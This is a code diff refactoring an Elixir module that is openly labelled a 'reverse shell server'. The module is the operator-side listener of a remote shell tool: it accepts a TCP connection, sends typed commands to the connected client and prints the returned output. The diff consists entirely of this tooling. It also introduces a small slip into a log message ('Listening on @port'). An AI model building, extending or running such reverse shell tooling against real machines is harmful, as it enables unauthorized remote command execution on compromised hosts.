@@ -3,31 +3,30 @@ defmodule Ers.Server do
 
   import Ers.Server.Utils.IO
 
-  @module     __MODULE__
-  @supervisor __MODULE__.Supervisor
-
-  def accept_opts,  do: [:binary, packet: :line, active: false, reuseaddr: true]
-  def port,         do: Application.get_env(:ers_server, :port)
-  def prompt,       do: Application.get_env(:ers_server, :prompt)
-  def version,      do: Ers.Server.Mixfile.project[:version]
-  def end_of_input, do: Application.get_env(:ers_server, :end_of_input) <> "\n"
-  def timeout,      do: Application.get_env(:ers_server, :timeout) <> "\n"
+  @module       __MODULE__
+  @supervisor   __MODULE__.Supervisor
+  @accept_opts  [:binary, packet: :line, active: false, reuseaddr: true]
+  @port         Application.get_env(:ers_server, :port)
+  @prompt       Application.get_env(:ers_server, :prompt)
+  @version      Ers.Server.Mixfile.project[:version]
+  @end_of_input Application.get_env(:ers_server, :end_of_input) <> "\n"
+  @timeout      Application.get_env(:ers_server, :timeout) <> "\n"
 
   def start(_type, _args) do
     import Supervisor.Spec, warn: false
 
-    children = [worker(Task, [@module, :listen, [port]])]
+    children = [worker(Task, [@module, :listen, [@port]])]
 
-    put_success("<<<Elixir reverse shell server v#{version}>>>")
+    put_success("<<<Elixir reverse shell server v#{@version}>>>")
 
     opts = [strategy: :one_for_one, name: @supervisor]
     Supervisor.start_link(children, opts)
   end
 
-  def listen(port) do
-    {:ok, socket} = :gen_tcp.listen(port, accept_opts)
+  def listen(@port) do
+    {:ok, socket} = :gen_tcp.listen(@port, @accept_opts)
 
-    put_info("Listening on port #{port}...")
+    put_info("Listening on @port #{@port}...")
 
     accept(socket)
   end
@@ -41,7 +40,7 @@ defmodule Ers.Server do
   end
 
   def process(client, :send) do
-    cmd = IO.gets prompt
+    cmd = IO.gets @prompt
     :gen_tcp.send(client, cmd <> "\n")
 
     process(client, :read)
@@ -55,13 +54,17 @@ defmodule Ers.Server do
   end
 
   def process(client, resp) when is_bitstring(resp) do
-    if resp == end_of_input, do: process(client, :send),
-       else: handle_message(client, resp)
+    case resp do
+      @end_of_input -> process(client, :send)
+      _             -> handle_message(client, resp)
+    end
   end
 
   def handle_message(client, msg) do
-    if msg == timeout, do: put_error("timeout"),
-       else: put_msg(String.rstrip(msg))
+    case msg do
+      @timeout -> put_error("timeout")
+      _        -> put_msg(String.rstrip(msg))
+    end
 
     process(client, :read)
   end
